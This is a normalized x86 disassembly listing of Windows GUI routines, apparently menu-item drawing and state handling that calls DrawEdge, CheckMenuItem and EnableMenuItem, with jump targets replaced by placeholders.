mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d83c
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423e68
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423718
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423720
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423720
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423718
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a2d0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4236f4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_4517cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_429274
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_422f54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d83c
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423720
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450828
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423220
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423e68
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423c48
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44db2c
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423e68
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_423a18
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_422f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40324c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450828
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451c8f
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44f8ec
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_423cc8
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_450828
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_451ddc
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_4527c0
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_451e0c
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_451e58
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45203a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403448
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_451e0c
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_4527c0
mov esi eax
mov eax edi
call sub_451ddc
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c58
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404034
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44f8ec
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4042a8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452041
lea eax [ ebp - 0x24 ]
call sub_403f9c
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_450828
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45206c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4043a8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403ff0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_452094
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_452204
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_452214
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_4520dc
sub_4520dc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_450798
push eax
call CheckMenuItem
mov eax esi
call sub_452094
sub_452130
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_452204
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_450798
push eax
call EnableMenuItem
sub_4521a8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_452568
mov edx eax
mov ecx ebx
mov eax edi
call sub_450738
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_452094
sub_452214
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a238
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44f840
sub_452284
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_452204
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45226c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45259c
mov ecx ebx
mov edx esi
mov eax edi
call sub_452390
sub_4522ca
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_452204
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_452214
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_452324
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_452204
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_452214
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_452214
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_452390
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44f840
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_450738
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41a2b4
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_452608
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_452204
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_450668
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41a238
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_41a238
mov dl [ eax + 0x3f ]
mov eax esi
call sub_4521a8
sub_452444
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44f840
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_452204
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_450668
mov eax ebx
call sub_452204
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a238
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41a128
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_4524b8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
